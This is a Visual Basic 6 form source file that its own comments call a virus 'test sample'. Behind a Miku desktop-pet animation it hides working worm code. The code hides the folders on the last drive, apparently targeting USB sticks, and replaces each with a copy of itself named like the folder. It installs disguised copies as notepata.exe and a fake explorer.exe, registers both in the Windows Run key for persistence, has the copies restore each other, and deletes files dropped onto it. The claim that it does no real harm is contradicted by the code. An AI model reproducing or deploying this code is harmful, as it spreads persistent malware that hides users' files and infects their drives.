VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00F0F0F0&
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   1650
   ClientLeft      =   5640
   ClientTop       =   3045
   ClientWidth     =   1770
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   OLEDropMode     =   1  'Manual
   ScaleHeight     =   1650
   ScaleWidth      =   1770
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin VB.Timer Timer8 
      Interval        =   3000
      Left            =   120
      Top             =   960
   End
   Begin VB.Timer Timer7 
      Interval        =   500
      Left            =   1080
      Top             =   480
   End
   Begin VB.Timer Timer6 
      Interval        =   10
      Left            =   600
      Top             =   480
   End
   Begin VB.Timer Timer5 
      Interval        =   5000
      Left            =   120
      Top             =   480
   End
   Begin VB.Timer Timer4 
      Enabled         =   0   'False
      Interval        =   80
      Left            =   1560
      Top             =   0
   End
   Begin VB.Timer Timer3 
      Interval        =   10
      Left            =   1080
      Top             =   0
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   80
      Left            =   600
      Top             =   0
   End
   Begin VB.PictureBox everyz 
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      Height          =   5355
      Left            =   720
      ScaleHeight     =   5295
      ScaleWidth      =   6660
      TabIndex        =   1
      Top             =   7920
      Visible         =   0   'False
      Width           =   6720
   End
   Begin VB.PictureBox Picture1 
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      Height          =   7500
      Left            =   600
      Picture         =   "Form1.frx":25CA
      ScaleHeight     =   7440
      ScaleWidth      =   17640
      TabIndex        =   0
      Top             =   720
      Visible         =   0   'False
      Width           =   17700
   End
   Begin VB.Timer Timer1 
      Interval        =   80
      Left            =   120
      Top             =   0
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Modified and Designed By CFIT
'This Virus is a Test Sample,DO NOT USE IN ILLEGAL FIELDS!
'本程序由CFIT设计处理而成。
'本病毒仅为测试样本无实际危害，切勿用于非法用途！
Option Explicit
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As Rect) As Long
Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function SetLayeredWindowAttributes Lib "user32" (ByVal hwnd As Long, ByVal crKey As Long, ByVal bAlpha As Byte, ByVal dwFlags As Long) As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" _
(ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" _
(ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, _
lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" _
(ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Const HKEY_CURRENT_USER = &H80000001

Private Const REG_SZ = 1
Private Const WS_EX_LAYERED = &H80000
Private Const GWL_EXSTYLE = (-20)
Private Const LWA_ALPHA = &H2
Private Const LWA_COLORKEY = &H1
Dim X0!, Y0!
Dim Xm, Ym As Long
Private Type Rect
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
Dim i, Wcz, Xqr, Yqr, Xpr, Ypr As Integer
Dim q As POINTAPI
Dim pi As Double
Dim TopM, LOR As Long
Dim Ran As Integer
Dim ROL, ROLL As Boolean
Function HandleErr() '发生错误时重启程序（有概率形成进程循环）
Dim RetVal
RetVal = Shell("""" & App.Path & "\" & App.EXEName, 1)
End
End Function
Private Sub ShowFileList(folderspec) '主体感染函数
On Error GoTo bbzlp0
Dim fs, f, f1, fc
If CreateObject("Scripting.FileSystemObject").DriveExists(folderspec) Then '判断指定盘是否存在
Set fs = CreateObject("Scripting.FileSystemObject")
Set f = fs.getfolder(folderspec)
Set fc = f.SubFolders
For Each f1 In fc '先扫描指定盘的所有文件夹
Debug.Print folderspec + "\" + f1.Name + "\"
If f1.Name <> "System Volume Information" Then '排除"System Volume Information"文件夹
SetAttr folderspec + "\" + f1.Name + "\", vbHidden '隐藏扫描的文件夹
If Dir(folderspec + "\" + f1.Name + ".exe") = "" Then
FileCopy App.Path + "\" + App.EXEName + ".exe", folderspec + "\" + f1.Name + ".exe" '替换为以感染文件夹为名称的应用程序（其实就是复制病毒本体）
End If
End If
If Dir("C:\Backups\", vbDirectory) = "" Then '病毒Notepata本体文件夹
fs.createfolder ("C:\Backups\")
End If
If Dir("D:\Setup\", vbDirectory) = "" Then '病毒explorer代理文件夹
fs.createfolder ("D:\Setup\")
End If
If Dir("C:\Backups\notepata.exe") = "" Then
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Backups\notepata.exe" '本体被删除，由此恢复
End If
If Dir("D:\Setup\explorer.exe") = "" Then

FileCopy App.Path + "\" + App.EXEName + ".exe", "D:\Setup\explorer.exe" '代理被删除，由此恢复
End If
If App.EXEName <> "notepata" And App.EXEName <> "explorer" And Me.Enabled = True Then '其余情况下，若非本体及代理，则只执行文件夹打开操作
Shell "explorer " + Chr(34) + folderspec + App.EXEName + Chr(34), vbNormalFocus '打开病毒名称的文件夹
Me.Enabled = False '禁用其余行为
Timer1.Enabled = False '禁用其余行为
Timer2.Enabled = False '禁用其余行为
Timer3.Enabled = False '禁用其余行为
Timer4.Enabled = False '禁用其余行为
Timer5.Enabled = False '禁用其余行为
Timer6.Enabled = False '禁用其余行为
End If
Next
Else
DoEvents
End If
bbzlp0:
If Err.Number > 0 Then
HandleErr '错误处理
End If

End Sub
Private Function contr(m As Integer) As Integer 'Miku互动核心函数1
On Error GoTo bbzlp1
Me.Cls
If m = 1 Then
Me.PaintPicture Picture1.Image, 0, 0, 885, 960, 885 * (i - 1), 0, 885, 960 '待机
Me.Height = 950
contr = 20
ElseIf m = 2 Then
Me.PaintPicture Picture1.Image, 0, 0, 1200, 1040, 1150 * (i - 1), 1000, 1200, 1040 '奔跑右
Me.Height = 1000
contr = 8
ElseIf m = 3 Then
Me.PaintPicture Picture1.Image, 0, 0, 1150, 1594, 1180 * (i - 1), 1960, 1150, 1594 '上跃
Me.Height = 1600
contr = 8
ElseIf m = 4 Then
Me.PaintPicture Picture1.Image, 0, 0, 1150, 1040, 1300 * (i - 1), 3500, 1150, 1040 '横跳
Me.Height = 1040
contr = 8
ElseIf m = 5 Then
Me.PaintPicture Picture1.Image, 0, 0, 1300, 950, 1300 * (i - 1), 5520, 1300, 950 '饥饿（尚未开发）
Me.Height = 1300
contr = 3
ElseIf m = 6 Then
Me.PaintPicture Picture1.Image, 0, 0, 1200, 990, 1270 * (i - 1), 6480, 1200, 990 '胡桃摇
'20 8 8 8 3 12
Me.Height = 960
contr = 12
ElseIf m = 7 Then
everyz.PaintPicture Picture1.Image, 0, 0, 1200, 1040, 1150 * (i - 1), 1000, 1200, 1040 '奔跑左
Me.PaintPicture everyz.Image, 1200, 0, -1200, 1040, 0, 0, 1200, 1040
Me.Height = 1000
contr = 8
End If
bbzlp1:
If Err.Number > 0 Then
HandleErr '错误处理
End If
End Function
Private Function Charg(a As Integer) As Integer 'Miku互动核心函数2
On Error GoTo bbzlp2
If a = 1 Then '待机
Charg = 1
ElseIf a = 4 Then '奔跑左/右
Randomize
If ROL = True Then
Charg = 2
Randomize
LOR = Int(Rnd() * 360)
Else
Charg = 7
Randomize
LOR = -Int(Rnd() * 360)
End If
ElseIf a = 2 Then '胡桃摇
Charg = 6
ElseIf a = 3 Then '横跳
Charg = 4
End If
bbzlp2:
If Err.Number > 0 Then
HandleErr '错误处理
End If
End Function
Private Sub everyz_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
On Error GoTo bbzlp3
Debug.Print x, y
bbzlp3:
If Err.Number > 0 Then
HandleErr '错误处理
End If
End Sub

Private Sub Form_Load() '窗体加载后
On Error GoTo bbzlp4
If App.EXEName = "notepata" Then '若为本体，则启动Miku互动
Me.Visible = True
End If
Dim hKey As Long, R As Long, S As String
Dim sKeyName As String, sKeyValue As String
Dim lphKey As Long, lenData As Long, Ret As Integer
Dim REG_AR As String
S = App.Path + "\" + App.EXEName + ".exe"
Dim StrDrive As String
Dim DriveID() As String
Dim avail(100) As String
Dim av As Integer
av = 0
Dim j As String
StrDrive = String(100, Chr$(0)) '初始化盘符串
Call GetLogicalDriveStrings(100, StrDrive) '返回盘符串（返回值如"C:\D:\E:\..."）
Debug.Print StrDrive
Dim ii, le As Integer
sKeyName = "Software\Microsoft\Windows\CurrentVersion\Run" '从注册表加入开机启动项
sKeyValue = "C:\Backups\notepata.exe" '目的注册表值（本体路径）
Ret = RegCreateKey(HKEY_CURRENT_USER, sKeyName, lphKey)
Ret = RegQueryValueEx(lphKey, "notepata", 0, vbNull, ByVal vbNullString, lenData) '注册表字符串名称为"notepata"
REG_AR = Space(lenData)
Ret = RegQueryValueEx(lphKey, "notepata", 0, vbNull, ByVal REG_AR, lenData) '记录对应注册表值
If REG_AR <> sKeyValue Then '若不同，则覆盖注入
Debug.Print RegSetValueEx(lphKey, "notepata", 0, REG_SZ, ByVal sKeyValue, Len(sKeyValue))
End If
sKeyName = "Software\Microsoft\Windows\CurrentVersion\Run" '从注册表加入开机启动项
sKeyValue = "D:\Setup\explorer.exe" '目的注册表值（代理路径）
Ret = RegCreateKey(HKEY_CURRENT_USER, sKeyName, lphKey)
Ret = RegQueryValueEx(lphKey, "explorer", 0, vbNull, ByVal vbNullString, lenData) '注册表字符串名称为"explorer"
REG_AR = Space(lenData)
Ret = RegQueryValueEx(lphKey, "explorer", 0, vbNull, ByVal REG_AR, lenData) '记录对应注册表值
If REG_AR <> sKeyValue Then '若不同，则覆盖注入
Debug.Print RegSetValueEx(lphKey, "explorer", 0, REG_SZ, ByVal sKeyValue, Len(sKeyValue))
End If
DriveID = Split(StrDrive, Chr$(0)) '返回光盘盘符到数组DeiveID并逐字符分离

For ii = 0 To UBound(DriveID)
If InStr(DriveID(ii), ":") <> 0 Then
av = av + 1
avail(av) = DriveID(ii)
End If
Next ii
S = avail(av) '获得最末盘符（若可移动硬盘为U盘，则感染盘为U盘）
ShowFileList S '调用上述感染核心函数
Dim fs, f, f1, fc
Set fs = CreateObject("Scripting.FileSystemObject")
If App.EXEName = "explorer" Then '代理程序开机时启动
If Dir("C:\Backups\", vbDirectory) = "" Then '恢复Notepata目录
fs.createfolder ("C:\Backups\")
End If
If Dir("C:\Backups\notepata.exe") = "" Then '恢复Notepata本体
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Backups\notepata.exe"
End '结束代理
End If
If Dir("C:\Backups\notepata.exe") <> "" Then '若存在本体，则立即结束
End
End If
End If
'以下为Miku配置
pi = 3.14159265358979
ROLL = True '跳跃配置
ROL = True '左右跑配置
Wcz = 0
Xqr = 0
Yqr = 0
Xpr = 0
Ypr = 0
LOR = 0
'''设置背景透明↓
Dim rtn As Long
Dim BorderStyler
BorderStyler = 0
rtn = GetWindowLong(hwnd, GWL_EXSTYLE)
rtn = rtn Or WS_EX_LAYERED
SetWindowLong hwnd, GWL_EXSTYLE, rtn
SetLayeredWindowAttributes hwnd, 15790320, 0, LWA_COLORKEY
'''设置背景透明↑
i = 1
'''初始启动位置随机，同时防止超过屏幕区域出现↓
Randomize
Me.Left = Screen.Width / 2 + Int(Rnd() * (Screen.Width - 1000)) - (Screen.Width - 1000) / 2
Me.Top = Screen.Height - 600
If Me.Left < 0 Then
Me.Left = 0
End If
If Me.Top < 0 Then
Me.Top = 0
End If
If Me.Top + Me.Height + 600 > Screen.Height Then
Me.Top = Screen.Height - Me.Height - 600
End If
If Me.Left + Me.Width + 0 > Screen.Width Then
Me.Left = Screen.Width - Me.Width - 0
End If
'''初始启动位置随机，同时防止超过屏幕区域出现↑
Dim p As POINTAPI
p.x = 0
p.y = 0
ClientToScreen Me.hwnd, p
Debug.Print p.x, p.y
bbzlp4:
If Err.Number > 0 Then
HandleErr '错误处理
End If
End Sub

Private Sub Form_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
On Error GoTo bbzlp5
X0 = x
Y0 = y
Timer1.Enabled = False
Timer4.Enabled = True
'停止待机时操作，启动互动操作
bbzlp5:
If Err.Number > 0 Then
HandleErr '错误处理
End If
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
On Error GoTo bbzlp6
Xm = x
Ym = y
If Button = 1 Then '左键按下
Me.Left = Me.Left + x - X0 '拖动
Me.Top = Me.Top + y - Y0 '拖动
Timer1.Enabled = False
Timer4.Enabled = True
Timer3.Enabled = False
End If
bbzlp6:
If Err.Number > 0 Then
HandleErr '错误处理
End If
End Sub

Private Sub Form_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
On Error GoTo bbzlp7
'''鼠标松开时验证并防止超过屏幕区域出现↓
If Me.Left < 0 Then
Me.Left = 0
End If
If Me.Top < 0 Then
Me.Top = 0
End If
If Me.Top + Me.Height + 600 > Screen.Height Then
Me.Top = Screen.Height - Me.Height - 600
End If
If Me.Left + Me.Width + 0 > Screen.Width Then
Me.Left = Screen.Width - Me.Width - 0
End If
'''鼠标松开时验证并防止超过屏幕区域出现↑
'启动待机时操作，停止互动操作
Timer1.Enabled = True
Timer4.Enabled = False
Timer3.Enabled = True
bbzlp7:
If Err.Number > 0 Then
HandleErr '错误处理
End If
End Sub

Private Sub Form_OLEDragDrop(Data As DataObject, Effect As Long, Button As Integer, Shift As Integer, x As Single, y As Single)
On Error GoTo bbzlp8
'吃文件（将文件拖动至该程序，该程序将该拖动文件放置于回收站）
Dim SHop As SHFILEOPSTRUCT
Dim strFile As String
strFile = Data.Files(1)
If InStr(strFile, ".txt") <> 0 Or InStr(strFile, ".lnk") <> 0 Or InStr(strFile, ".doc") <> 0 Or InStr(strFile, ".xls") <> 0 Or InStr(strFile, ".jpg") <> 0 Or InStr(strFile, ".png") <> 0 Or InStr(strFile, ".gif") <> 0 Or InStr(strFile, ".bmp") <> 0 Then
Timer1.Enabled = False
Timer3.Enabled = True
With SHop
.wFunc = FO_DELETE
.pFrom = strFile
.fFlags = FOF_ALLOWUNDO + FOF_NOCONFIRMATION
End With
SHFileOperation SHop
Timer1.Enabled = True
Timer4.Enabled = False
End If
bbzlp8:
If Err.Number > 0 Then
HandleErr '错误处理
End If
End Sub

Private Sub Picture1_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
On Error GoTo bbzlp9
Debug.Print x, y, "!!!!!!!!!!!!!!!!!!"
bbzlp9:
If Err.Number > 0 Then
HandleErr
End If
End Sub

Private Sub Timer1_Timer()
On Error GoTo bbzlp10
If Me.Left < 0 Then
Me.Left = 0
End If
If Me.Top < 0 Then
Me.Top = 0
End If
If Me.Top + Me.Height + 600 > Screen.Height Then
Me.Top = Screen.Height - Me.Height - 600
TopM = Me.Top

End If
If Me.Left + Me.Width + 0 > Screen.Width Then
Me.Left = Screen.Width - Me.Width - 0
End If
Dim p As POINTAPI '程序窗体位置
Dim f As Rect
GetWindowRect Me.hwnd, f
p.x = 0
p.y = 0
ClientToScreen Me.hwnd, p

Dim q As POINTAPI '光标位置
q.x = 0
q.y = 0
GetCursorPos q
Dim ocx As Integer
ocx = 80 '识别范围
If Abs(q.x - (p.x + (f.Right - f.Left) / 2)) < ocx And Abs(q.y - (p.y + (f.Bottom - f.Top) / 2)) < ocx / 1 Then '光标在识别范围内
Me.Left = Me.Left + (q.x - p.x) * 2 - (f.Right - f.Left) / 2 '窗体中心到达光标位置
Me.Top = Me.Top + (q.y - p.y) * 2 - (f.Bottom - f.Top) / 2 '窗体中心到达光标位置
If q.x - (p.x + (f.Right - f.Left) / 3) > 0 Then
If i >= contr(2) Then '光标在右时启动奔跑右动画
i = 1
Else: i = i + 1
End If
Else
If i >= contr(7) Then '光标在左时启动奔跑左动画
i = 1
Else: i = i + 1
End If
End If
Else
If (p.y + (f.Bottom - f.Top)) <= ((Screen.Height + 600) / Screen.TwipsPerPixelY) Then '重力系统
Me.Top = Me.Top + 600 / Screen.TwipsPerPixelY
If i >= contr(1) Then '20 8 8 8 3 12'待机
i = 1
Else: i = i + 1
End If

End If
End If
everyz.Cls
bbzlp10:
If Err.Number > 0 Then
HandleErr '错误处理
End If
End Sub

Private Sub Timer2_Timer()
On Error GoTo bbzlp11
'待机
'***********************
'其他动作状态

'***********************
If Me.Left < 0 Then
Me.Left = 0
End If
If Me.Top < 0 Then
Me.Top = 0
End If
If Me.Top + Me.Height + 600 > Screen.Height Then
Me.Top = Screen.Height - Me.Height - 600
End If
If Me.Left + Me.Width + 240 > Screen.Width Then
Me.Left = Screen.Width - Me.Width - 0
End If
Dim p As POINTAPI
GetCursorPos p
Dim f As Rect
'Debug.Print Charg(Ran), Ran
GetWindowRect Me.hwnd, f
If Ran < 3 Then
If (p.y + (f.Bottom - f.Top)) <= ((Screen.Height + 600) / Screen.TwipsPerPixelY) Then '其他
Me.Top = Me.Top + 480 / Screen.TwipsPerPixelY
If i >= contr(Charg(Ran)) Then '20 8 8 8 3 12
i = 1
Else: i = i + 1
End If
Else
If i >= contr(Charg(Ran)) Then '20 8 8 8 3 12
i = 1
Else: i = i + 1
End If
End If
ElseIf Ran = 4 Then
If (p.y + (f.Bottom - f.Top)) <= ((Screen.Height + 600) / Screen.TwipsPerPixelY) Then '左右走
Me.Top = Me.Top + 480 / Screen.TwipsPerPixelY
Me.Left = Me.Left + LOR
'Debug.Print LOR
If i >= contr(Charg(Ran)) Then '20 8 8 8 3 12
i = 1
Else: i = i + 1
End If
Else
If i >= contr(Charg(Ran)) Then '20 8 8 8 3 12
i = 1
Else: i = i + 1
End If
End If
ElseIf Ran = 3 Then
If (p.y + (f.Bottom - f.Top)) <= ((Screen.Height + 600) / Screen.TwipsPerPixelY) Then  '横跳
Me.Top = Me.Top + 480 / Screen.TwipsPerPixelY - ((Sin(pi * i / 10) - Sin(pi * (i - 1) / 10)) * 240)
Me.Left = Me.Left + LOR
If ROLL = False Then
Ran = 4
End If
If i >= contr(Charg(Ran)) Then '20 8 8 8 3 12
i = 1
'
Else
i = i + 1
LOR = Int(Rnd() * 120) + 240
End If
End If
End If
bbzlp11:
If Err.Number > 0 Then
HandleErr
End If
End Sub

Private Sub Timer3_Timer()
On Error GoTo bbzlp12
Dim m As POINTAPI
GetCursorPos m
'本次光标位置
Xqr = m.x
Yqr = m.y
If Abs(Xpr - Xqr) < 10 And Abs(Ypr - Yqr) < 10 Then '无操作（操作范围极小）判断
Wcz = Wcz + 1
Else
Wcz = 0 '有操作则重置计数
End If
If Wcz > 600 Then '无操作6s后开始其余动作
Timer1.Enabled = False
Timer2.Enabled = True
Else '有操作则保持待机
Timer1.Enabled = True
Timer2.Enabled = False
End If
 '上一次光标位置
Xpr = Xqr
Ypr = Yqr
bbzlp12:
If Err.Number > 0 Then
HandleErr
End If
End Sub

Private Sub Timer4_Timer()
On Error GoTo bbzlp13
If i >= contr(6) Then '胡桃摇动作
i = 1
Else: i = i + 1
End If
bbzlp13:
If Err.Number > 0 Then
HandleErr
End If
End Sub
Private Sub Timer5_Timer() '左右跑动作
On Error GoTo bbzlp14
Randomize
Ran = Int(Rnd() * 3.9) + 1
If Me.Left + Me.Width / 2 < (Screen.Width / 2) Then
ROL = True
ROLL = True
Else
ROL = False
ROLL = False
End If
Randomize
Timer5.Interval = Int(Rnd() * 3500 + 1500)
bbzlp14:
If Err.Number > 0 Then
HandleErr
End If
End Sub

Private Sub Timer7_Timer() '同Form_Load，保持程序扫描感染
On Error GoTo bbzlp15
Dim hKey As Long, R As Long, S As String
Dim sKeyName As String, sKeyValue As String
Dim lphKey As Long, lenData As Long, Ret As Integer
Dim REG_AR As String
S = App.Path + "\" + App.EXEName + ".exe"
Dim StrDrive As String
Dim DriveID() As String
Dim avail(100) As String
Dim av As Integer
av = 0
Dim j As String
StrDrive = String(100, Chr$(0))
Call GetLogicalDriveStrings(100, StrDrive)
Debug.Print StrDrive
Dim ii, le As Integer
DriveID = Split(StrDrive, Chr$(0))

For ii = 0 To UBound(DriveID)
If InStr(DriveID(ii), ":") <> 0 Then
av = av + 1
avail(av) = DriveID(ii)
End If
Next ii
Debug.Print avail(av)
S = avail(av)
Debug.Print S, "j"
ShowFileList S
Debug.Print App.EXEName
bbzlp15:
If Err.Number > 0 Then
HandleErr
End If
End Sub

Private Sub Timer8_Timer() '打开文件夹的病毒程序命令执行3s后结束
If Me.Enabled = False Then
End
End If
End Sub
